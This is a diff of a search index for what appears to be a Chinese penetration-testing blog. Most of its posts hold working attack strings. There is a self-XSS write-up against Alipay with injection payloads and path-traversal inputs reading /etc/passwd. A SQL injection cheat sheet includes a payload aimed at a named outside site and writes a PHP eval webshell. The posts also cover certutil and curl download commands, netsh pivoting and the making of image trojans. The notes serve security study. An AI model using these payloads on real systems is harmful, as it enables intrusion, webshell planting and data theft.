@@ -1,6 +1,30 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title><![CDATA[Python selenium第三方库的安装与使用]]></title>
+    <url>%2F2020%2F05%2F01%2FPython%20selenium%E7%AC%AC%E4%B8%89%E6%96%B9%E5%BA%93%E7%9A%84%E5%AE%89%E8%A3%85%E4%B8%8E%E4%BD%BF%E7%94%A8%2F</url>
+    <content type="text"><![CDATA[使用selenium库之前，需要安装Python3 Python3环境搭建参考：https://www.runoob.com/python3/python3-install.html 安装Selenium库访问：https://pypi.org/project/selenium/#files 点击扩展名为.gz的源码包进行下载：下载后解压，cmd环境进入到setup.py文件所在目录：执行 python setup.py install 命令进行安装安装完成后，执行pip list命令即可看到selenium的信息： 下载driver驱动（以Google Chrome为例）查看Google Chrome版本，菜单-帮助-关于Google Chrome：查看Google Chrome版本（如有自动更新，请等待程序完成更新）：访问：http://npm.taobao.org/mirrors/chromedriver/ 找到与本机Google Chrome版本最接近的版本链接：点击下载win32平台的zip文件 安装完成，运行脚本将下载好的driver驱动与Python脚本放在同一目录下：写几行代码进行测试test.py Code12345678# 导入Selenium库from selenium import webdriver# 创建类对象(Google Chrome为例)driver = webdriver.Chrome()# 跳转至https://baidu.comdriver.get(&quot;https://blog.csdn.net/u010508029/article/details/105868385&quot;)# 获取当前driver对象的title并打印在控制台print(driver.title) 在该目录打开cmd窗口，执行Python脚本即可。如果调出Google Chrome，并跳转至当前教程页面，并在控制台打印出教程页面的title即为成功~]]></content>
+      <categories>
+        <category>编程语言</category>
+      </categories>
+      <tags>
+        <tag>Python</tag>
+        <tag>Selenium</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[Windows cmd下载文件]]></title>
+    <url>%2F2020%2F02%2F04%2FWindows%20cmd%E4%B8%8B%E8%BD%BD%E6%96%87%E4%BB%B6%2F</url>
+    <content type="text"><![CDATA[Code123456certutil -urlcache -split -f http://fsunset.cn/test.txt &gt; 1.txtcurl http://fsunset.cn/test.txt pass.txt &gt; 1.txtwget http://fsunset.cn/test.txt pass.txt]]></content>
+      <categories>
+        <category>渗透测试</category>
+      </categories>
+      <tags>
+        <tag>cmd</tag>
+        <tag>Windows</tag>
+      </tags>
+  </entry>
+  <entry>
     <title><![CDATA[蚂蚁森林self xss]]></title>
     <url>%2F2020%2F01%2F14%2F%E8%9A%82%E8%9A%81%E6%A3%AE%E6%9E%97self%20xss%2F</url>
     <content type="text"><![CDATA[记录一次支付宝的self xss 这两天闲的没(dan)事(teng)，刚好昨晚朋友圈刷了一波蚂蚁森林的self xss，那我也把之前的蚂蚁森林的self xss拿出来玩了一下，发现之前的&lt;script&gt;标签已经被过滤了。 既然&lt;script&gt;被过滤了，脑海中第二反应就是&lt;img&gt;了。 Code1&lt;img/src onerror=alert`哈哈`&gt; 好吧，还真容易，成功弹窗了~其实还有很多姿势可以成功弹窗，比如: Code123456&lt;svg/onload=alert`1`&gt;&lt;img/src onerror=alert`1`&gt;&lt;iframe/onload=alert`1`&gt;&lt;p/oncut=alert`1`&gt;&lt;TAG EVENT=alert`1`&gt;等等... 但是注意这里有字符限制，只允许输入30个字符。 然后昨晚8点多的时候支付宝就已经将改漏洞修复了。出现了熟悉的页面提示。。。 抱着侥幸的心理再尝试一下，一波操作后发现&lt;img&gt;，&lt;iframe&gt;还能用，只不过onerorr被过滤了，那我们就放弃&lt;img&gt;，尝试&lt;iframe&gt;标签。在自己服务器新建了一个页面，插到弹幕中去。x.html Code12345&lt;html&gt;&lt;script&gt;alert(`666`);&lt;/script&gt;&lt;/html&gt; 尝试第一个Payload Code1&lt;iframe src=&quot;http://fsunset.cn/x.html&quot;&gt; 好吧，支付宝间接的提示我太长了。。。 既然这样，让我直接将默认主页设置为x.html这个页面呗，就改一小会，反正我的网站也没人访问。 第二个Payload上场 Code1&lt;iframe src=&quot;http://fsunset.cn&quot;&gt; 嗯，好吧。还是太长了。。。心中一阵绞痛，为什么当初没买几个短一点的域名，当初如果把qq.com，jd.com买下来，今天还搞不定一个self xss??? 恢复理智之后。。。好吧，我TM把http去掉不就行了么。。。 Code1&lt;iframe src=&quot;//fsunset.cn&quot;&gt; 这里第一次尝试的时候没有弹窗。可能是上面的x.html写的有问题。。。好吧，有点牵强 然后我继续尝试第三种Payload Code1&lt;iframe src=&quot;http:fsunset.cn&quot;&gt; 不多不少当好30个字符 插进去试试呗，噢，，，一发入魂，成了 既然成了，杀个程序员祭天呗…改了自己服务器上的x.html页面后再次尝试 Code1&lt;iframe src=&quot;//fsunset.cn&quot;&gt; 发现是可以弹窗的 虽然这个漏洞没有什么技术含量，但是主要是尝试和绕过的限制一个过程。 尝试的过程中，顺便偷了一波能量，所以也导致某些人直接给我送礼]]></content>
@@ -124,19 +148,6 @@
       </tags>
   </entry>
   <entry>
-    <title><![CDATA[文件查看与下载]]></title>
-    <url>%2F2019%2F08%2F19%2F%E6%96%87%E4%BB%B6%E6%9F%A5%E7%9C%8B%E4%B8%8E%E4%B8%8B%E8%BD%BD%2F</url>
-    <content type="text"><![CDATA[背景 一些网站的业务需求，可能提供文件查看或下载的功能，如果对用户 查看或下载的文件不做限制，就能够查看或下载任意的文件，可以是源 代码文件、敏感文件等等。 成因 不管是任意文件读取还是任意文件下载，触发的漏洞条件都是相同的 存在读取文件的函数 读取文件的路径用户可控且未校验或校验不严 输出了文件内容 漏洞危害 下载服务器任意文件，包含脚本代码文件 、系统敏感文件等。可以 配合其它类型的漏洞。可以进一步代码审计，查找更多可利用的代码。 漏洞分类 任意文件读取 Code12345678910111213&lt;?php $filename=&quot;test.txt&quot;;readfile($filename);?&gt;&lt;?php $filename=&quot;test.txt&quot;;echo file_get_contens($filename);?&gt;&lt;?php $filename=&quot;test.txt&quot;; $fp=fopen($filename,&quot;r&quot;)or die(&quot;Unable to open file!&quot;); $data=fread($fp,1024); fclose($fp); echo $data;?&gt; $filename=$_GET[f]; $filename没有经过校验,或者校验不合格,用户可以控制这个变量读取任意文件,比如/etc/passwd,index.php等等. 任意文件下载 Code123456789101112131415&lt;?php if(empty($_GET[&apos;filename&apos;]))&#123; exit(); &#125; $filename=$_GET[&apos;filename&apos;]; *eader(&quot;Content-Type:application/octet-stream&quot;); header(&quot;Accept-Length:&quot;.filesize($filename)); header(&quot; Content-Disposition:attachment;filename=&quot;.$filename ); readfile($filename);?&gt; 在上述代码中: $filename=&quot;uploads/20170206.jpg&quot;; $filename一般是用户需要下载的文件 $filename$_GET[f]; $filename没有经验校验,或者校验不合格,用户可以控制这个变量下载任意文件,比如/etc/passwd 漏洞挖掘 Web漏洞扫描器(AWVS,AppScan,Openvas,Nessus) 手动从链接 readfile.php?file=xxx.txt download.php?file=xxx.rar 参数名查看 &amp;readpath,&amp;filepath,&amp;path,&amp;inputfile,&amp;url,&amp;data,&amp;readfile,&amp;menu,META-INF,WEB-INF 漏洞验证 index.php?f=../../../../../etc/passwd index.php?f=../index.php index.php?f=file:///etc/passwd 当参数f值为php文件时: 若文件被解析则是文件包含漏洞 若显示源码,则是文件查看漏洞 提示下载则是文件下载漏洞 漏洞修复方案 过滤 . 点,使用户在url中不能回溯上级目录 正则严格判断用户输入的参数 php.ini配置open_basedir限制文件访问范围]]></content>
-      <categories>
-        <category>渗透测试</category>
-      </categories>
-      <tags>
-        <tag>PHP</tag>
-        <tag>文件查看</tag>
-        <tag>文件下载</tag>
-      </tags>
-  </entry>
-  <entry>
     <title><![CDATA[Network-Shell端口转发]]></title>
     <url>%2F2019%2F08%2F19%2FNetwork-Shell%2F</url>
     <content type="text"><![CDATA[NetSH(Network Shell)是windows系统本身提供的功能强大的网络配置命令行工具 netsh interface portproxy add v4tov4 – 添加通过 IPv4 的 IPv4 和代理连接到的侦听项目 netsh interface portproxy add v4tov4 [listenport=]|[connectaddress=]|[[connectport=]|][[listenaddress=]|] [[protocol=]tcp] 参数 listenport IPv4 侦听端口 connectaddress IPv4 连接地址 connectport IPv4 连接端口 listenaddress IPv4 侦听地址 protocol 使用的协议。现在只支持 TCP 实例 netsh interface portproxy add v4tov4 listenaddress=192.168.1.8 listenport=14941 connectaddress=192.168.1.118 connectport=1494 在IPV4下将监听本地IP 192.168.1.8:14941,接受到的数据转发给192.168.1.118:1494 netsh interface portproxy delete v4tov4 listenaddress=192.168.1.8 listenport=33891 在IPV4下删除监听本地IP 192.168.1.8:33891 netsh interface portproxy show v4tov4 查看在IPV4下配置的端口转发的策略]]></content>
@@ -147,6 +158,19 @@
         <tag>端口转发</tag>
         <tag>内网渗透</tag>
         <tag>工具</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[文件查看与下载]]></title>
+    <url>%2F2019%2F08%2F19%2F%E6%96%87%E4%BB%B6%E6%9F%A5%E7%9C%8B%E4%B8%8E%E4%B8%8B%E8%BD%BD%2F</url>
+    <content type="text"><![CDATA[背景 一些网站的业务需求，可能提供文件查看或下载的功能，如果对用户 查看或下载的文件不做限制，就能够查看或下载任意的文件，可以是源 代码文件、敏感文件等等。 成因 不管是任意文件读取还是任意文件下载，触发的漏洞条件都是相同的 存在读取文件的函数 读取文件的路径用户可控且未校验或校验不严 输出了文件内容 漏洞危害 下载服务器任意文件，包含脚本代码文件 、系统敏感文件等。可以 配合其它类型的漏洞。可以进一步代码审计，查找更多可利用的代码。 漏洞分类 任意文件读取 Code12345678910111213&lt;?php $filename=&quot;test.txt&quot;;readfile($filename);?&gt;&lt;?php $filename=&quot;test.txt&quot;;echo file_get_contens($filename);?&gt;&lt;?php $filename=&quot;test.txt&quot;; $fp=fopen($filename,&quot;r&quot;)or die(&quot;Unable to open file!&quot;); $data=fread($fp,1024); fclose($fp); echo $data;?&gt; $filename=$_GET[f]; $filename没有经过校验,或者校验不合格,用户可以控制这个变量读取任意文件,比如/etc/passwd,index.php等等. 任意文件下载 Code123456789101112131415&lt;?php if(empty($_GET[&apos;filename&apos;]))&#123; exit(); &#125; $filename=$_GET[&apos;filename&apos;]; *eader(&quot;Content-Type:application/octet-stream&quot;); header(&quot;Accept-Length:&quot;.filesize($filename)); header(&quot; Content-Disposition:attachment;filename=&quot;.$filename ); readfile($filename);?&gt; 在上述代码中: $filename=&quot;uploads/20170206.jpg&quot;; $filename一般是用户需要下载的文件 $filename$_GET[f]; $filename没有经验校验,或者校验不合格,用户可以控制这个变量下载任意文件,比如/etc/passwd 漏洞挖掘 Web漏洞扫描器(AWVS,AppScan,Openvas,Nessus) 手动从链接 readfile.php?file=xxx.txt download.php?file=xxx.rar 参数名查看 &amp;readpath,&amp;filepath,&amp;path,&amp;inputfile,&amp;url,&amp;data,&amp;readfile,&amp;menu,META-INF,WEB-INF 漏洞验证 index.php?f=../../../../../etc/passwd index.php?f=../index.php index.php?f=file:///etc/passwd 当参数f值为php文件时: 若文件被解析则是文件包含漏洞 若显示源码,则是文件查看漏洞 提示下载则是文件下载漏洞 漏洞修复方案 过滤 . 点,使用户在url中不能回溯上级目录 正则严格判断用户输入的参数 php.ini配置open_basedir限制文件访问范围]]></content>
+      <categories>
+        <category>渗透测试</category>
+      </categories>
+      <tags>
+        <tag>PHP</tag>
+        <tag>文件查看</tag>
+        <tag>文件下载</tag>
       </tags>
   </entry>
   <entry>
@@ -163,18 +187,6 @@
       </tags>
   </entry>
   <entry>
-    <title><![CDATA[SQL注入]]></title>
-    <url>%2F2019%2F08%2F16%2FSQL%E6%B3%A8%E5%85%A5%2F</url>
-    <content type="text"><![CDATA[SQL注入 and 1=1 / and 1=2 回显页面不同（整形判断） 单引号判断 ‘ 显示数据库错误信息或者页面回显不同（整形，字符串类型判断） \ (转义符) -1/+1 回显下一个或上一个页面（整型判断） and sleep(5) UNION query SQL injection（可联合查询注入） 前提:页面上有显示位,缺点亦是页面上必须有显示位 优点:方便,快捷,易于利用 判断列数 : order by 4 (数值取到最大,页面显示正常,下一步判断显示位) 判断显示位 : php?id=-1 union select 1,2,3,4 //id=-1 让第一行无法正常显示,显示出显示位 http://www.asfaa.org/members.php?id=-3 union select 1,database(),3,group_concat(table_name) from information_schema.tables where table_schema=database() //爆出当前库所有表名 Error-based SQL injection（报错型注入） 页面上没有显示位,但是需要输出SQL语句执行错误信息( 比如:mysqli_error() ) 优点不需要显示位 通过floor报错 floor 通过 and extractvalue(1,payload) 报错 http://127.0.0.1/st/day02/baji/vul/user/show_error.php?id=1 and extractvalue(1,concat(0x27,(select group_concat(table_name) from information_schema.tables where table_schema=database()))) //爆出所有表名 通过 and updatexml(1,payload,1)报错 与extractvalue(1,payload)相同 Boolean-based blind SQL injection（布尔型注入） 优点 : 不需要显示位,不需要报错信息 只能通过页面返回正常与否判断 , 速度慢 , 花费大量时间 常用的几个函数 : substr(‘user’,1,1) = u ascii(‘u’) =117 http://127.0.0.1/st/day02/baji/vul/user/show.php?id=1&#39; and 1 –+ //and 1 页面显示正常 http://127.0.0.1/st/day02/baji/vul/user/show.php?id=1&#39; and 0 –+ //and 0 页面无显示 http://127.0.0.1/st/day02/baji/vul/user/show.php?id=1&#39; and length(database())=4 –+ 当length(database())=4时页面显示正常,证明数据库名是4个字符组成 http://127.0.0.1/st/day02/baji/vul/user/show.php?id=1&#39; and substr(database(),1,1)=’b’ –+ and substr(database(),1,1)=’b’ 页面显示正常 , 证明当前数据库名的第一个字符为 ‘b’ 因为当substr(database(),1,1)=’b’成立时等价于1,后续更改substr()函数的参数及可获取完整数据库名,表名,列名操作相同 Time-based blind SQL injection（基于时间延迟注入） 不需要显示位,不需要出错信息 速度慢 , 耗费大量时间 原理与bool注入相同 if(条件,1,2)函数 : 当条件为真时返回1,为假时返回2 http://127.0.0.1/st/day02/baji/vul/user/show.php?id=1&#39; and if(length(database())=4,sleep(4),1) –+ 当length(database())=4为真时 , 就等待4秒 Mysql注释 #(url编码为%23) – (–后面要跟上一个或多个空格:可用+号代替空格–+) /*…*/ /*!…*/ 内联注释 select * /*!222from*/ user; Mysql常用函数(配合select使用) user() 当前登录数据库的用户 database() 当前数据库 @@version 数据库版本 session_user() @@basedir 数据库安装路径 @@datadir 数据存放路径 @@version_complie_os 服务器操作系统 load_file() 读文件 知道文件绝对路径 能够使用union查询 对web目录有写入权限 UNION SELECT 1,load_file(‘/etc/passwd’),3,4,5,6 –+ UNION SELECT 1,load_file(0x2f6574632f706173737764),3,4,5,6 –+ into outfile() 写文件操作 必须用绝对路径 用户必须有写入文件的权限 没有对’号过滤 SELECT ‘&lt;?php @eval($_POST[‘qwer’]);?&gt;‘ into outfile ‘c:\Windows\tmp\1.php’ concat(str1,str2) 连接字符串 str1str2 concat_ws(‘拼接分离的字符串’,str1,str2) -&gt; str1拼接分离的字符串str2 group_concat(select username from user) -&gt; username1,username2]]></content>
-      <categories>
-        <category>渗透测试</category>
-      </categories>
-      <tags>
-        <tag>SQL注入</tag>
-        <tag>Mysql</tag>
-      </tags>
-  </entry>
-  <entry>
     <title><![CDATA[TCP三次握手]]></title>
     <url>%2F2019%2F08%2F16%2FTCP%E4%B8%89%E6%AC%A1%E6%8F%A1%E6%89%8B%2F</url>
     <content type="text"><![CDATA[SYN,ACK,FIN存放在TCP的标志位,一共有6个字符,这里就介绍这三个： SYN 代表请求创建连接,所以在三次握手中前两次要SYN=1,表示这两次用于建立连接,至于第三次什么用,在疑问三里解答。 FIN 表示请求关闭连接,在四次分手时,我们发现FIN发了两遍。这是因为TCP的连接是双向的,所以一次FIN只能关闭一个方向。 ACK 代表确认接受,从上面可以发现,不管是三次握手还是四次分手,在回应的时候都会加上ACK=1,表示消息接收到了,并且在建立连接以后的发送数据时,都需加上ACK=1,来表示数据接收成功。 seq 序列号,什么意思呢？ 当发送一个数据时,数据是被拆成多个数据包来发送,序列号就是对每个数据包进行编号,这样接受方才能对数据包进行再次拼接 为什么需要四次分手？ TCP是双向的，所以需要在两个方向分别关闭，每个方向的关闭又需要请求和确认，所以一共就4次]]></content>
@@ -187,14 +199,15 @@
       </tags>
   </entry>
   <entry>
-    <title><![CDATA[图片马制作]]></title>
-    <url>%2F2019%2F08%2F12%2F%E5%9B%BE%E7%89%87%E9%A9%AC%E5%88%B6%E4%BD%9C%2F</url>
-    <content type="text"><![CDATA[copy xx.jpg /b + xx.txt /a = shell.jpg/b 二进位文件(不破原文件)/a ASCII 文本文件]]></content>
+    <title><![CDATA[SQL注入]]></title>
+    <url>%2F2019%2F08%2F16%2FSQL%E6%B3%A8%E5%85%A5%2F</url>
+    <content type="text"><![CDATA[SQL注入 and 1=1 / and 1=2 回显页面不同（整形判断） 单引号判断 ‘ 显示数据库错误信息或者页面回显不同（整形，字符串类型判断） \ (转义符) -1/+1 回显下一个或上一个页面（整型判断） and sleep(5) UNION query SQL injection（可联合查询注入） 前提:页面上有显示位,缺点亦是页面上必须有显示位 优点:方便,快捷,易于利用 判断列数 : order by 4 (数值取到最大,页面显示正常,下一步判断显示位) 判断显示位 : php?id=-1 union select 1,2,3,4 //id=-1 让第一行无法正常显示,显示出显示位 http://www.asfaa.org/members.php?id=-3 union select 1,database(),3,group_concat(table_name) from information_schema.tables where table_schema=database() //爆出当前库所有表名 Error-based SQL injection（报错型注入） 页面上没有显示位,但是需要输出SQL语句执行错误信息( 比如:mysqli_error() ) 优点不需要显示位 通过floor报错 floor 通过 and extractvalue(1,payload) 报错 http://127.0.0.1/st/day02/baji/vul/user/show_error.php?id=1 and extractvalue(1,concat(0x27,(select group_concat(table_name) from information_schema.tables where table_schema=database()))) //爆出所有表名 通过 and updatexml(1,payload,1)报错 与extractvalue(1,payload)相同 Boolean-based blind SQL injection（布尔型注入） 优点 : 不需要显示位,不需要报错信息 只能通过页面返回正常与否判断 , 速度慢 , 花费大量时间 常用的几个函数 : substr(‘user’,1,1) = u ascii(‘u’) =117 http://127.0.0.1/st/day02/baji/vul/user/show.php?id=1&#39; and 1 –+ //and 1 页面显示正常 http://127.0.0.1/st/day02/baji/vul/user/show.php?id=1&#39; and 0 –+ //and 0 页面无显示 http://127.0.0.1/st/day02/baji/vul/user/show.php?id=1&#39; and length(database())=4 –+ 当length(database())=4时页面显示正常,证明数据库名是4个字符组成 http://127.0.0.1/st/day02/baji/vul/user/show.php?id=1&#39; and substr(database(),1,1)=’b’ –+ and substr(database(),1,1)=’b’ 页面显示正常 , 证明当前数据库名的第一个字符为 ‘b’ 因为当substr(database(),1,1)=’b’成立时等价于1,后续更改substr()函数的参数及可获取完整数据库名,表名,列名操作相同 Time-based blind SQL injection（基于时间延迟注入） 不需要显示位,不需要出错信息 速度慢 , 耗费大量时间 原理与bool注入相同 if(条件,1,2)函数 : 当条件为真时返回1,为假时返回2 http://127.0.0.1/st/day02/baji/vul/user/show.php?id=1&#39; and if(length(database())=4,sleep(4),1) –+ 当length(database())=4为真时 , 就等待4秒 Mysql注释 #(url编码为%23) – (–后面要跟上一个或多个空格:可用+号代替空格–+) /*…*/ /*!…*/ 内联注释 select * /*!222from*/ user; Mysql常用函数(配合select使用) user() 当前登录数据库的用户 database() 当前数据库 @@version 数据库版本 session_user() @@basedir 数据库安装路径 @@datadir 数据存放路径 @@version_complie_os 服务器操作系统 load_file() 读文件 知道文件绝对路径 能够使用union查询 对web目录有写入权限 UNION SELECT 1,load_file(‘/etc/passwd’),3,4,5,6 –+ UNION SELECT 1,load_file(0x2f6574632f706173737764),3,4,5,6 –+ into outfile() 写文件操作 必须用绝对路径 用户必须有写入文件的权限 没有对’号过滤 SELECT ‘&lt;?php @eval($_POST[‘qwer’]);?&gt;‘ into outfile ‘c:\Windows\tmp\1.php’ concat(str1,str2) 连接字符串 str1str2 concat_ws(‘拼接分离的字符串’,str1,str2) -&gt; str1拼接分离的字符串str2 group_concat(select username from user) -&gt; username1,username2]]></content>
       <categories>
         <category>渗透测试</category>
       </categories>
       <tags>
-        <tag>木马</tag>
+        <tag>SQL注入</tag>
+        <tag>Mysql</tag>
       </tags>
   </entry>
   <entry>
@@ -207,6 +220,17 @@
       <tags>
         <tag>phpmyadmin</tag>
         <tag>Webshell</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[图片马制作]]></title>
+    <url>%2F2019%2F08%2F12%2F%E5%9B%BE%E7%89%87%E9%A9%AC%E5%88%B6%E4%BD%9C%2F</url>
+    <content type="text"><![CDATA[copy xx.jpg /b + xx.txt /a = shell.jpg/b 二进位文件(不破原文件)/a ASCII 文本文件]]></content>
+      <categories>
+        <category>渗透测试</category>
+      </categories>
+      <tags>
+        <tag>木马</tag>
       </tags>
   </entry>
   <entry>
